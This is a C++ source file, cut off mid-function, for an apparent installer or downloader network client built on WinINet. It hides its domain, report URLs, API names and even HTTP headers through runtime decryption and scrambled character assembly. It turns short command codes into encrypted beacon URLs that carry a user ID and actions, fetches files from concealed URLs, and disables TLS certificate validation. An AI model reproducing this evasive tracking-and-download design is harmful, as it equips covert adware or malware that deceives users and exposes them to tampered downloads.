#include "StdAfx.h"
#include "InetClient.h"

InetClient::InetClient(void)
{
	m_bUsePrevRND = false;
	m_bConnected  = false;
	m_hInternet   = m_hSession = NULL;
	
	m_szSSLCert[IC_SSL_CERT_BUF_SIZE - 1] = _T('\0');
	
	CXRString cxrUserAgent(CXR_NSIS_INETC_MOZILLA);
	m_sUserAgent.assign(cxrUserAgent.DecryptRaw());
	cxrUserAgent.Clear();
	
	#if defined(_DEBUG) && defined(IC_DBG_PRINT)
	PRINT_LOG("InetClient(); ctor.");
	#endif
	cxrMainDomain.SetValue(CXR_MAINDomain);
	cxrReportUrlA.SetValue(CXR_ReportUrlA);
	cxrReportUrlB.SetValue(CXR_ReportUrlB);
}

InetClient::~InetClient(void)
{
	this -> Disconnect();
}

std::string InetClient::URLEncode(const std::string &value)
{
	const TCHAR DEC2HEX[16 + 1] = _T("0123456789ABCDEF");
	
	std::string escaped = _T("");
	
	for(unsigned int i = 0; i < value.length(); i++)
	{
		if( value[i] == _T('%') || value[i] == _T('$') || value[i] == _T('&') || value[i] == _T('+') || value[i] == _T(',')  ||
		    value[i] == _T('/') || value[i] == _T(':') || value[i] == _T('[') || value[i] == _T(']') || value[i] == _T('\\') ||
		    value[i] == _T(';') || value[i] == _T('=') || value[i] == _T('?') || value[i] == _T('@') || value[i] == _T('#')  || 
		    value[i] < 0x20 || value[i] > 0x7E )
		{
			escaped += _T('%');
			escaped += DEC2HEX[ (value[i] >> 4) & 0x0F];
			escaped += DEC2HEX[ value[i] & 0x0F];
		}
		else
		{
			if( value[i] == _T(' '))
			{
				escaped += _T('+');
			}
			else
			{
				escaped += value[i];
			}
		}
	}

	return escaped;
}

bool InetClient::Connect(const std::string &host, int port = INTERNET_DEFAULT_HTTP_PORT, DWORD dwAccessType = INTERNET_OPEN_TYPE_PRECONFIG)
{
	m_bConnected = true;
	
	// Clear from preceding client usage if we forgot to disconnect:
	Disconnect();

	m_bConnected = true;
	
	// INTERNET_OPEN_TYPE_PRECONFIG - retrieves the proxy or direct configuration from the registry.
	// After the calling application has finished using the HINTERNET handle returned by InternetOpen, it must be closed using the InternetCloseHandle function.
    // Like all other aspects of the WinINet API, this function cannot be safely called from within DllMain or the constructors and destructors of global objects.
	if( (m_hInternet = InternetOpen(m_sUserAgent.c_str(), dwAccessType, NULL, NULL, 0)) == NULL )
	{
		m_dwErr = GetLastError();
		m_bConnected = false;
	}
    
	// Like all other aspects of the WinINet API, this function cannot be safely called from within DllMain or the constructors and destructors of global objects.
	if( (m_hSession = InternetConnect(m_hInternet, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)) == NULL )
    {
        m_dwErr = GetLastError();
		m_bConnected = false;
    }

    return m_bConnected;
}

bool InetClient::Disconnect()
{
    if (m_bConnected)
    {
        // The function terminates any pending operations on the handle and discards any outstanding data.
		if( m_hSession != NULL )
		{
			if( InternetCloseHandle(m_hSession) != NULL )
			{
				m_hSession   = NULL;
				m_bConnected = false;
			}
			else
				m_dwErr = GetLastError();
		}
		if( m_hInternet != NULL )
		{
			if( InternetCloseHandle(m_hInternet) != NULL )
			{
				m_hInternet  = NULL;
				m_bConnected = false;
			}
			else
				m_dwErr = GetLastError();
		}
	}

	if( m_bConnected )
	{
		return false;
	}
	else
	{
		return true;
	}
}

bool InetClient::ParseURL(const std::string &url, InetClient::Scheme &scheme, std::string &host, int &port, std::string &query)
{
	std::string remains;
	
	// SplitURLScheme:
	{
	std::string delimiter(_T("://"));
    size_t delimiterIndex = url.find(delimiter);

	const bool noDelimiterFound		 = ( delimiterIndex == std::string::npos );
    const bool noDataBeforeDelimiter = ( delimiterIndex == 0 );
    const bool noDataAfterDelimiter  = ( delimiterIndex + delimiter.length() >= url.length() );

    if ( noDelimiterFound || noDataBeforeDelimiter || noDataAfterDelimiter )
        return false;

	std::string schemeStr = url.substr(0, delimiterIndex);
	std::transform(schemeStr.begin(), schemeStr.end(), schemeStr.begin(), ::tolower);

    if (schemeStr == _T("http"))
	{
        scheme = Scheme::HTTP;
	}
	else
    if (schemeStr == _T("https"))
    {
        scheme = Scheme::HTTPS;
    }
	else
	{
		return false;
	}

	remains = url.substr(delimiterIndex + delimiter.length());
	}

	// ParseURLRemains:
	{
	const size_t colonIndex = remains.find(_T(':'));
    const size_t slashIndex = remains.find(_T('/'));

	const bool colonFound = (colonIndex != std::string::npos);
	const bool slashFound = (slashIndex != std::string::npos);

    const bool noHost = ( colonIndex == 0 || slashIndex == 0 );
    const bool noPortAfterColon = ( colonFound && slashFound && slashIndex == colonIndex + 1 );

    if (noHost || noPortAfterColon)
        return false;

    const bool portSpecified = ( colonFound && (!slashFound || colonIndex < slashIndex) );

    if (portSpecified)
    {
		const size_t portLength = ( slashFound ? slashIndex - colonIndex - 1 : std::string::npos );
        
		// todo: change atoi to something more suitable.
		port = atoi(remains.substr(colonIndex + 1, portLength).c_str());
        if ( ! ( port >= 1 && port <= 65535 ) )
				return false;
    }
    else
    {
        port = GetDefaultPort(scheme);
    }

    const size_t hostLength = ( colonIndex <= slashIndex ? colonIndex : slashIndex );
    host = remains.substr(0, hostLength);

    if (slashFound && slashIndex + 1 < remains.length())
    {
		query = remains.substr(slashIndex, std::string::npos);
    }
    else
    {
        query = _T("/");
    }
	}

    return true;
}

unsigned int InetClient::GetDefaultPort(const Scheme &scheme)
{
    switch(scheme)
    {
    case Scheme::HTTP:
        return 80;
    case Scheme::HTTPS:
        return 443;
    }

	return 0;
}

std::string InetClient::GetRequestMethod(const RequestMethod &requestMethod)
{
    switch (requestMethod)
    {
    case RequestMethod::GET:
        return _T("GET");
    case RequestMethod::POST:
        return _T("POST");
    }
	
	return _T("");
}

bool InetClient::IsProxyEnabled(const Scheme scheme = Scheme::HTTPS)
{
	CXRString cxrInetSettings(CXR_REG_INTERNET_SETTINGS);
	std::string strInetSettings(cxrInetSettings.DecryptRaw());
	cxrInetSettings.Clear();

	CXRString cxrProxyEnable(CXR_PROXY_ENABLE);
	std::string strProxyEnable(cxrProxyEnable.DecryptRaw());
	cxrProxyEnable.Clear();

	CXRString cxrProxyServer(CXR_PROXY_SERVER);
	std::string strProxyServer(cxrProxyServer.DecryptRaw());
	cxrProxyServer.Clear();

	// todo: check if it is okay in debbuger:
	DWORD proxyEnableValue = GetRegistryDwordValue(HKEY_CURRENT_USER, strInetSettings, strProxyEnable);
	std::string proxyServerValue = GetRegistryStringValue(HKEY_CURRENT_USER, strInetSettings, strProxyServer);

	const bool proxyEnabled = (proxyEnableValue == 1);
	const size_t httpIndex  = proxyServerValue.find(_T("http="));
	const size_t httpsIndex = proxyServerValue.find(_T("https="));

	const bool httpFound  = (httpIndex  != std::string::npos);
	const bool httpsFound = (httpsIndex != std::string::npos);

	if (proxyEnabled)
	{
		if (!httpFound && !httpsFound)
		{
			return true;
		}
		if (scheme == Scheme::HTTP && httpFound)
		{
			return true;
		}
		if (scheme == Scheme::HTTPS && httpsFound)
		{
			return true;
		}
	}

	return false;
}

bool InetClient::IsAvailableDirectConnection()
{
#ifdef USE_FIDDLER
	return false;
#endif // USE_FIDDLER

	bool directConnection = false;
	
	TCHAR url[11]; // google.com
	url[4] = _T('l'); url[5] = _T('e'); url[9] = _T('m'); url[8] = _T('o'); url[3] = _T('g'); url[6] = _T('.'); url[10] = _T('\0');
	url[7] = _T('c'); url[2] = _T('o'); url[0] = _T('g'); url[1] = _T('o');
	
	if( ! Connect(url, GetDefaultPort(Scheme::HTTP), INTERNET_OPEN_TYPE_DIRECT) )
	{
		return false;
	}
	
	DWORD dwRequestFlags = 0;
	// On Windows 7, Windows Server 2008 R2, and later, the lpszVersion parameter is overridden by Internet Explorer settings.
	HINTERNET hRequest = HttpOpenRequest(m_hSession, NULL, _T("/"), NULL, NULL, NULL, dwRequestFlags, 0);
	
	if (hRequest == NULL)
	{
		m_dwErr = GetLastError();
		return false;
	}
	
	// An application can use the same HTTP request handle in multiple calls to HttpSendRequest,
	// but the application must read all data returned from the previous call before calling the function again.
	// In offline mode, HttpSendRequest returns ERROR_FILE_NOT_FOUND if the resource is not found in the Internet cache.
	BOOL retSend = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
	
	if (retSend == TRUE)
	{
		DWORD statusCode = 0;
		DWORD dwSize = sizeof(DWORD);
		
		BOOL ret = HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &dwSize, NULL);

		if (ret == TRUE && statusCode == 200)
		{
			directConnection = true;
		}
	}
	
	InternetCloseHandle(hRequest);
	
	Disconnect();

	return directConnection;
}

typedef DWORD (WINAPI *pCertNameToStrA)(DWORD dwCertEncodingType, PCERT_NAME_BLOB pName, DWORD dwStrType, LPSTR psz, DWORD csz);
typedef void  (WINAPI *pCertFreeCertificateChain)(PCCERT_CHAIN_CONTEXT pChainContext);

bool InetClient::SendRequest(const std::string &url, std::string &response, const RequestMethod requestMethod /*= RequestMethod::GET*/, const std::string &postData /*= _T("")*/, bool bGetSSLCert /*= false*/)
{
    Scheme			scheme;
	std::string		host;
	int				port;
	std::string		query;
    
	if( ! ParseURL(url, scheme, host, port, query) )
	{
		return false;
	}
    
	DWORD dwAccessType = INTERNET_OPEN_TYPE_DIRECT;
    
	if (IsProxyEnabled(scheme))
    {
        if ( ! IsAvailableDirectConnection() )
        {
            dwAccessType = INTERNET_OPEN_TYPE_PRECONFIG;
        }
    }
    
	if( ! Connect(host, port, dwAccessType) )
	{
		return false;
	}
    
    DWORD dwRequestFlags = 0;
    if (scheme == Scheme::HTTPS)
    {
        dwRequestFlags = INTERNET_FLAG_SECURE;
        // Ignore invalid SSL certificate
        dwRequestFlags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
        dwRequestFlags |= INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }
	// NOCOOKIES
	dwRequestFlags |= INTERNET_FLAG_NO_CACHE_WRITE;
	dwRequestFlags |= INTERNET_FLAG_NO_COOKIES;
	dwRequestFlags |= INTERNET_FLAG_KEEP_CONNECTION;

    HINTERNET hRequest = HttpOpenRequest(m_hSession, GetRequestMethod(requestMethod).c_str(), query.c_str(), HTTP_VERSION, NULL, NULL, dwRequestFlags, 0);
    if (hRequest == NULL)
	{
		m_dwErr = GetLastError();
		Disconnect();

		return false;
	}
    
	BOOL retSend = FALSE;
    if (requestMethod == RequestMethod::POST)
    {
        TCHAR head[48]; // Content-Type: application/x-www-form-urlencoded
        head[23] = _T('o'); head[26] = _T('x'); head[14] = _T('a'); head[4]  = _T('e'); head[8]  = _T('T'); head[1]  = _T('o'); head[35] = _T('m'); head[40] = _T('e'); head[42] = _T('c'); 
        head[9]  = _T('y'); head[24] = _T('n'); head[32] = _T('f'); head[29] = _T('w'); head[31] = _T('-'); head[41] = _T('n'); head[45] = _T('e'); head[11] = _T('e'); head[17] = _T('l'); 
        head[3]  = _T('t'); head[43] = _T('o'); head[36] = _T('-'); head[13] = _T(' '); head[44] = _T('d'); head[6]  = _T('t'); head[5]  = _T('n'); head[20] = _T('a'); head[30] = _T('w'); 
        head[33] = _T('o'); head[28] = _T('w'); head[2]  = _T('n'); head[21] = _T('t'); head[19] = _T('c'); head[18] = _T('i'); head[39] = _T('l'); head[27] = _T('-'); head[47] = _T('\0'); 
        head[38] = _T('r'); head[7]  = _T('-'); head[46] = _T('d'); head[0]  = _T('C'); head[16] = _T('p'); head[34] = _T('r'); head[12] = _T(':'); head[25] = _T('/'); head[10] = _T('p'); 
        head[15] = _T('p'); head[22] = _T('i'); head[37] = _T('u'); 
		std::string headers = head;
        
		retSend = HttpSendRequest(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()), LPVOID(postData.c_str()), static_cast<DWORD>(postData.length()));
    }
    else
	if (requestMethod == RequestMethod::GET)
	{
        retSend = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
	}

	if (retSend == NULL)
	{
		m_dwErr = GetLastError();
		InternetCloseHandle(hRequest);
		Disconnect();
		
		return false;
	}
			
	if (bGetSSLCert)
	{
		PCCERT_CHAIN_CONTEXT CertCtxPtr = NULL;
		
		// V568 It's odd that 'sizeof()' operator evaluates the size of a pointer to a class, but not the size of the 'CertCtx' class object.
		// Checked in debugger that InternetQueryOptions sets pointer to an address of some allocated struct:
		DWORD cbCertSizePtr = sizeof(CertCtxPtr);
		int impleCertChainIndex = 0;
		
		// Retrieves the server’s certificate-chain context as a duplicated PCCERT_CHAIN_CONTEXT.
		// You may pass this duplicated context to any Crypto API function which takes a PCCERT_CHAIN_CONTEXT.
		// You must call CertFreeCertificateChain on the returned PCCERT_CHAIN_CONTEXT when you are done with the certificate-chain context.
		// Version: Requires Internet Explorer 8.0.
		if ( InternetQueryOption(hRequest, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, (LPVOID)&CertCtxPtr, &cbCertSizePtr) )
		{
			PCCERT_CHAIN_CONTEXT pChainContext = CertCtxPtr;
			CERT_SIMPLE_CHAIN *simpleCertificateChainWithinContext = NULL;
			
			pCertFreeCertificateChain fCertFreeCertificateChain = NULL;

			if (pChainContext->rgpChain != NULL)
			{
				simpleCertificateChainWithinContext=pChainContext->rgpChain[0];
				if  (simpleCertificateChainWithinContext->cElement > 0)
				{
					PCCERT_CONTEXT pCertContext = simpleCertificateChainWithinContext->rgpElement[0]->pCertContext;

					pCertNameToStrA fCertNameToStrA = NULL;
					CXRString str(CXR_Crypt32dll);

					HMODULE hDll = LoadLibrary(str.DecryptRaw());
					if (hDll != NULL)
					{
						str.SetValue(CXR_CertNameToStrA);
						fCertNameToStrA = (pCertNameToStrA)GetProcAddress(hDll, str.DecryptRaw());

						str.SetValue(CXR_CertFreeCertificateChain);
						fCertFreeCertificateChain = (pCertFreeCertificateChain) GetProcAddress(hDll, str.DecryptRaw());
					}

					// Retrieve certificate issuer and save it into m_szSSLCert for future comparison:
					if (fCertNameToStrA != NULL)
						fCertNameToStrA(X509_ASN_ENCODING, &pCertContext->pCertInfo->Issuer, CERT_X500_NAME_STR, m_szSSLCert, IC_SSL_CERT_BUF_SIZE);

					// CERT_HASH_PROP_ID - is a thumbprint
					//CertNameToStrA(X509_ASN_ENCODING, &pCertContext->pCertInfo->Issuer, CERT_X500_NAME_STR, m_szSSLCert, IC_SSL_CERT_BUF_SIZE);
				}
			}
		
		if( fCertFreeCertificateChain != NULL )
			fCertFreeCertificateChain(CertCtxPtr);

		CertCtxPtr = NULL;
		}
	}
	
	// Read response:
	bool   bFinished = false;
	char   szResp[IC_TEMP_RESPONSE_BUF_SIZE];
	DWORD  dwBytesRead = 0;
	response.clear();
	
	while( !bFinished )
	{
		if( InternetReadFile(hRequest, szResp, sizeof(szResp) - 1, &dwBytesRead) == TRUE )
		{
			if( dwBytesRead > 0 )
			{
				// Won't work with unicode response std::string, needs byte to wchar conversion:
				szResp[dwBytesRead] = '\0';
				response += szResp;
			}
			else
			{
				bFinished = true;
			}
		}
		else
		{
			m_dwErr = GetLastError();
			response.clear();
			InternetCloseHandle(hRequest);
			Disconnect();

			return false;
		}
	}
    
	InternetCloseHandle(hRequest);
    Disconnect();
    
	return true;
}

bool InetClient::SendGetRequest(const std::string &url, std::string &response)
{
	bool ret = false;
	
	for (int i = 0; i < IC_MAX_TRIES; i++)
	{
		if ( ret = SendRequest(url, response, RequestMethod::GET, _T(""), false) )
			break;

		if (i < IC_MAX_TRIES - 1)
			SLEEP(IC_TRIES_DELAY);
	}
	
	return ret;
}

bool InetClient::SendGetRequestWithSSLCert(const std::string &url, std::string &response, std::string &strCertificate)
{
	bool ret = false;
	
	for (int i = 0; i < IC_MAX_TRIES; i++)
	{
		// SendRequest get SSL cert and saves it in m_szSSLCert:
		if ( ret = SendRequest(url, response, RequestMethod::GET, _T(""), true) ) 
		{
			strCertificate = m_szSSLCert;
			break;
		}
		
		if (i < IC_MAX_TRIES - 1)
			SLEEP(IC_TRIES_DELAY);
	}
	
	return ret;
}

bool InetClient::SendPostRequest(const std::string &url, const std::string &postData, std::string &response)
{
	bool ret = false;
	
	for (int i = 0; i < IC_MAX_TRIES; i++)
	{
		
		if ( ret = SendRequest(url, response, RequestMethod::POST, postData, false) )
			break;

		if (i < IC_MAX_TRIES - 1)
			SLEEP(IC_TRIES_DELAY);
	}
	
	return ret;
}

void InetClient::PrepareDownloadedFile()
{
	m_DownloadedFile.clear();
	m_DownloadedFileSize = 0;
	m_DownloadedFile.reserve(IC_PREALLOC_DOWNLOAD_BUF_SIZE);
}

bool InetClient::DownloadFile(const std::string &url)
{
	Scheme			scheme;
	std::string		host;
	int				port;
	std::string		query;

	if( ! ParseURL(url, scheme, host, port, query) )
	{
		return false;
	}

	DWORD dwAccessType = INTERNET_OPEN_TYPE_DIRECT;
	
	if (IsProxyEnabled(scheme))
    {
        if ( ! IsAvailableDirectConnection() )
        {
            dwAccessType = INTERNET_OPEN_TYPE_PRECONFIG;
        }
    }

	HINTERNET hInternet = InternetOpen(m_sUserAgent.c_str(), dwAccessType, NULL, NULL, 0);
	if (hInternet == NULL)
	{
		m_dwErr = GetLastError();
		return false;
	}
	
	DWORD dwRequestFlags = 0;
	
	if (scheme == Scheme::HTTPS)
	{
		dwRequestFlags = INTERNET_FLAG_SECURE;
		// Ignore invalid SSL certificate
		dwRequestFlags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
		dwRequestFlags |= INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
	}
	// NOCOOKIES
	dwRequestFlags |= INTERNET_FLAG_NO_CACHE_WRITE;
	dwRequestFlags |= INTERNET_FLAG_NO_COOKIES;

	TCHAR szHeader[20]; // Accept: */*\r\n\r\n
	szHeader[0] = _T('A'); szHeader[9]  = _T('/'); szHeader[8]  = _T('*'); szHeader[10] = _T('*');  szHeader[19] = _T('\0'); szHeader[16] = _T('r');
	szHeader[2] = _T('c'); szHeader[12] = _T('r'); szHeader[4] = _T('p'); szHeader[5]  = _T('t'); szHeader[14] = _T('n'); szHeader[17] = _T('\\');
	szHeader[3]  = _T('e');  szHeader[11] = _T('\\'); szHeader[6] = _T(':'); szHeader[15] = _T('\\');
	szHeader[7] = _T(' '); szHeader[18] = _T('n'); szHeader[1]  = _T('c'); szHeader[13] = _T('\\');

	HINTERNET hConnect = InternetOpenUrl(hInternet, url.c_str(), szHeader, sizeof(szHeader) / sizeof(TCHAR) - 1, dwRequestFlags, 0);
	if (hConnect == NULL)
	{
		m_dwErr = GetLastError();
		InternetCloseHandle(hInternet);
		
		return false;
	}

	// Try to ignore invalid SSL certificate:
	if (scheme == Scheme::HTTPS)
	{
		DWORD dwSecurityFlags;
		DWORD dwBuffLen = sizeof(dwSecurityFlags);
		
		if ( InternetQueryOption(hConnect, INTERNET_OPTION_SECURITY_FLAGS, static_cast<LPVOID>(&dwSecurityFlags), &dwBuffLen) )
		{
			dwSecurityFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
			InternetSetOption(hConnect, INTERNET_OPTION_SECURITY_FLAGS, &dwSecurityFlags, sizeof(dwSecurityFlags));
		}
	}
	
	// Read file:
	bool    bFinished = false;
	byte	FileBuf[IC_TEMP_DOWNLOAD_BUF_SIZE];
	DWORD	dwBytesRead = 0;

	// Clear the internal data structure and preallocate a buffer for downloaded file:
	PrepareDownloadedFile();
	
	while( !bFinished )
	{
		if( InternetReadFile(hConnect, FileBuf, sizeof(FileBuf), &dwBytesRead) == TRUE )
		{
			if( dwBytesRead > 0 )
			{
				m_DownloadedFile.insert(m_DownloadedFile.end(), FileBuf, FileBuf + dwBytesRead);
				m_DownloadedFileSize += dwBytesRead;
			}
			else // finished consecutive reading
			{
				bFinished = true;
			}
		}
		else // InternetReadfile error:
		{
			m_dwErr = GetLastError();
			InternetCloseHandle(hConnect);
			InternetCloseHandle(hInternet);
			
			return false;
		}
	}
	
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	
	return true;
}

void InetClient::EraseDownloadedFile()
{
	m_DownloadedFile.clear();
	m_DownloadedFileSize = 0;
	m_DownloadedFile.reserve(IC_PREALLOC_DOWNLOAD_BUF_SIZE);
}

size_t InetClient::GetDownloadedFileBufferSize()
{
	return m_DownloadedFileSize;
}

byte *InetClient::GetDownloadedFileBuffer()
{
	if( m_DownloadedFileSize > 0 )
		return &m_DownloadedFile[0];
	else
		return NULL;
}

// todo: verify that it works properly
DWORD InetClient::GetRegistryDwordValue(HKEY hive, std::string subKey, std::string value)
{
    HKEY key;
    DWORD result = 0;
    
	if (RegOpenKeyEx(hive, subKey.c_str(), 0, KEY_READ, &key) == ERROR_SUCCESS)
    {
        DWORD bufferSize = sizeof(DWORD);
        RegQueryValueEx(key, value.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&result), &bufferSize);
    }
    RegCloseKey(key);
    
	return result;
}

std::string InetClient::GetRegistryStringValue(HKEY hive, std::string subKey, std::string value)
{
    HKEY key;
	std::string result;
    
	if (RegOpenKeyEx(hive, subKey.c_str(), 0, KEY_READ, &key) == ERROR_SUCCESS)
    {
		std::vector<char> buffer;
        DWORD bufferSize = static_cast<DWORD>(buffer.size());
        
		LSTATUS success = RegQueryValueEx(key, value.c_str(), NULL, NULL, NULL, &bufferSize);
        if (success == ERROR_SUCCESS)
        {
            buffer.resize(bufferSize / sizeof(char));
            
			success = RegQueryValueEx(key, value.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&buffer[0]), &bufferSize);
            
			if (success == ERROR_SUCCESS)
            {
				int buflen = buffer.size();
				if (buflen > 0)
				{
					result = std::string(buffer.begin(), buffer.end() - 1);
				}
            }
        }
    }
    
	RegCloseKey(key);
    
	return result;
}
// ------------------------------------
// Inet related functions from URLManager (ex Onion)
void InetClient::gen_random(char *s, const int len) 
{
	
	const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	
	//CXRString str(CXR_alphanum);
	//std::string alphanum = str.DecryptRawString();

	srand( (unsigned int) time(NULL));
	unsigned int size;

	for (int i = 0; i < len; ++i) {
		rand_s(&size);
		s[i] = alphanum[size % (sizeof(alphanum) - 1)];
		//s[i] = alphanum[size % (alphanum.length() - 1)];
	}
    
	// Should be [len - 1], but the whole download process gets broken: 
	s[len] = 0;
}

void InetClient::ProcessURL(char* url)
{
	std::string str = url;

	switch (url[0])
	{
		case 'a':
			if (str.find("a:") == 0)
			{
				str.erase(0, 2);
				m_action = str;
				CreateReportUrl(url);
			} break;
		case 'u':
			if (str.find("u:") == 0)
			{
				str.erase(0, 2);
				m_UID = str;
				int pos = str.find("&a:");
				if (pos > 0)
				{
					m_UID.erase(pos, m_UID.size());
					m_action = str;
					m_action.erase(0, pos + 3);
				}
				CreateReportUrl(url);
			} break;
		case 'q':
			if (str.find("q:") == 0)
			{
				str.erase(0, 2);
				m_quant = str;
				int pos = str.find("&a:");
				if (pos >0)
				{
					m_quant.erase(pos, m_quant.size());
					m_action = str;
					m_action.erase(0, pos + 3);
				}
				CreateReportUrl(url);
			} break;
		case 'b':
			{
				if (str.find("b:") == 0)
				{
					str.erase(0, 2);
					CreateRawUrl(url, CXR_IPB, str.c_str(), false);
				}
			} break;
		case 'p':
			{
				if (str.find("p3:") == 0)
				{
					str.erase(0,3);
					CreateRawUrl(url, CXR_POSTDATA3, str.c_str(), false);
				}
				else
				{
					if (str.find("p4:") == 0)
					{
						str.erase(0, 3);
						CreateRawUrl(url, CXR_POSTDATA4, str.c_str(), false);
					}
					else
					{
						if (str.find("px:") == 0)
						{
							str.erase(0, 3);
							CreateRawUrl(url, CXR_Pixel, str.c_str(), false);
						}
						else
						{
							if (str.find("pf:") == 0)
							{
								CreateRawUrl(url, CXR_FUSE, "", false);
							}
							else
							{
								if (str.find("pt:") == 0)
								{
									CreateRawUrl(url, CXR_POSTTEST, "", false);
								}
								else
								{
									if (str.find("pa:") == 0)
									{
										CreateRawUrl(url, CXR_ADR, "", false);
									}
								}
							}
						}
					}
				}
			} break;
		case 'f':
			{
				if (str.find("f:") == 0)
				{
					str.erase(0, 2);
					CreateRawUrl(url, CXR_DL_URL, str.c_str(), true);
				}

			} break;
		case 'm':
			{
				if (str.find("m:") == 0)
				{
					str.erase(0, 2);
					CreateRawUrl(url, CXR_MD5Url, str.c_str(), true);
				}
				
			} break;
		case 'c':
			{
				if ( str.find("c3:") == 0)
				{
					CreateRawUrl(url, CXR_CF3, "", false);
				}
			} break;
		case 'r':
			{
				
				if ( str.find("rk1:") == 0)
				{
					CreateRawUrl(url, CXR_RKURL, "", true);
				}
			} break;
		case 't':
			{

				if ( str.find("t:") == 0)
				{
					str.erase(0, 2);
					if (str.find("q:") == 0)
					{
						str.erase(0, 2);
						m_quant = str;
						int pos = str.find("&u:");
						if (pos > 0)
						{
							m_quant.erase(pos, m_quant.size());
							m_UID = str;
							m_UID.erase(0, pos + 3);
						}
						CreateRawUrl(url, CXR_TIME2, "", true);
					}
					
				}
			} break;
	}
	
	for (unsigned int i = 0; i < str.length(); i++) 
	{
		str[i] = 0;
	}
	
}

void InetClient::CreateReportUrl(char *url)
{
	DWORD SecureBuffer[IC_SEC_BUF_SIZE];
	DWORD dwResultSize = 0;
	
	// first 16 bytes
 	char rbuffer1[256] = {0};
 		
	InetClient::gen_random(rbuffer1, 16);
 	
	// the rnd param
	char rbuffer2[256] = {0};
	
	unsigned int size;
	// If the function fails for any other reason, *randomValue is set to 0.
 	rand_s(&size);
 	
	InetClient::gen_random(rbuffer2, 30 + size % 30);
 	
	// decide if to use RND value from previous request.
	// do not overwrite stored RND value if the flag is turned on:
    if( this->m_bUsePrevRND == false ) 
 		this->m_RND = rbuffer2;
    
	// use stored value instead of generated one:
	if ( this->m_bUsePrevRND && this->m_RND.length() != 0 ) 
	{
		sprintf_s(rbuffer2, "%s", m_RND.c_str()); 
	}

	if ( m_quant.empty() )
	{
		// create report url - no quant:
		SecureSprintf(SecureBuffer, &dwResultSize, cxrReportUrlA.DecryptXOR(), rbuffer1, m_UID.c_str(), m_action.c_str(), rbuffer2, NULL);
		cxrReportUrlA.Clear();
	}
	else
	{
		// create full report url:
		SecureSprintf(SecureBuffer, &dwResultSize, cxrReportUrlB.DecryptXOR(), rbuffer1, m_UID.c_str(), m_quant.c_str(), m_action.c_str(), rbuffer2);
		cxrReportUrlB.Clear();
	}

	CXRString key(CXR_EAS_KEY);
	std::string strQueryEncrypted = URLCipher::WrapperEncrypt((unsigned char*)SecureBuffer, dwResultSize, key.DecryptRaw());
	#ifndef _DEBUG
	SecureZeroMemory((byte *) SecureBuffer, sizeof(SecureBuffer) );
	#endif _DEBUG
	
	std::string strURI = _T("https://");
	strURI += cxrMainDomain.DecryptRaw();
	
	strURI += _T("/?");
	strURI += strQueryEncrypted;
	
	#if defined(_DEBUG) && defined(IC_DBG_PRINT)
	byte *ptr = (byte *) SecureBuffer;
	for(unsigned int i = 0; i < dwResultSize; i++)
		*(ptr++) ^= 0xAA; 
	PRINT_LOG("\r\n------\r\nlen = %u (max_1024); url = %s\r\nSecBuf ^ AA -> %s\r\nResultingUrl-> %s\r\n------", strURI.length(), url, SecureBuffer, strURI.c_str());

	SecureZeroMemory((byte *) SecureBuffer, sizeof(SecureBuffer) );
	#endif

	// ! Assumes that the size of url buffer is equal to 1024 or larger:
	// @ 
	sprintf_s(url, 1024, _T("%s"), strURI.c_str());
	
}

void InetClient::CreateRawUrl(char *url, const char *cxr, const char *param, bool withQuant)
{
	DWORD SecureBuffer[IC_SEC_BUF_SIZE];
	DWORD dwResultSize = 0;

	CXRString cxrURL(cxr);
	
	// first 16 bytes
	char rbuffer1[256] = {0};
	InetClient::gen_random(rbuffer1, 16);
	
	// the rnd param
	char rbuffer2[256] = {0};
	
	unsigned int size;
	rand_s(&size);
	
	InetClient::gen_random(rbuffer2, 30 + size % 30);

	std::string sparam = param;

	// create the url :
	if (withQuant)
	{
		SecureSprintf(SecureBuffer, &dwResultSize, cxrURL.DecryptXOR(), rbuffer1, sparam.c_str(), m_quant.c_str(), rbuffer2, NULL);
		cxrURL.Clear();		
	}
	else
	{
		if ( sparam.length() > 0)	
		{ 
			sparam.insert(0, _T("&"));
		}
		SecureSprintf(SecureBuffer, &dwResultSize, cxrURL.DecryptXOR(), rbuffer1, sparam.c_str(), rbuffer2, NULL, NULL);
		cxrURL.Clear();
	}

	CXRString key(CXR_EAS_KEY);
	std::string strQueryEncrypted = URLCipher::WrapperEncrypt( (byte *) SecureBuffer, dwResultSize, key.DecryptRaw());
    #ifndef _DEBUG
	SecureZeroMemory((byte *) SecureBuffer, sizeof(SecureBuffer) );
	#endif	

	std::string strURI = _T("https://");
	strURI += cxrMainDomain.DecryptRaw();

	strURI += _T("/?");
	strURI += strQueryEncrypted;

	#if defined(_DEBUG) && defined(IC_DBG_PRINT)
	byte *ptr = (byte *) SecureBuffer;
	for(unsigned int i = 0; i < dwResultSize; i++)
		*(ptr++) ^= 0xAA; 
	PRINT_LOG("\r\n------\r\nWith quant[ %u ] len = %u (max_1024); url = %s\r\nSecBuf ^ AA -> %s\r\nResultingUrl-> %s\r\n------", withQuant, strURI.length(), url, SecureBuffer, strURI.c_str());

	SecureZeroMemory((byte *) SecureBuffer, sizeof(SecureBuffer) );
	#endif

	// ! Assumes that the size of url buffer is equal to 1024 or larger:
	// @ 
	sprintf_s(url, 1024, _T("%s"), strURI.c_str());
	
}

void InetClient::SecureSprintf(DWORD *dst, DWORD *dwResultSize, const char *source, const char *str1, const char * str2, const char * str3, const  char * str4, const char * str5)
{
	int pindex = 0;
	PCHAR param[5];
	
	param[0] = (char*)str1;
	param[1] = (char*)str2;
	param[2] = (char*)str3;
	param[3] = (char*)str4;
	param[4] = (char*)str5;

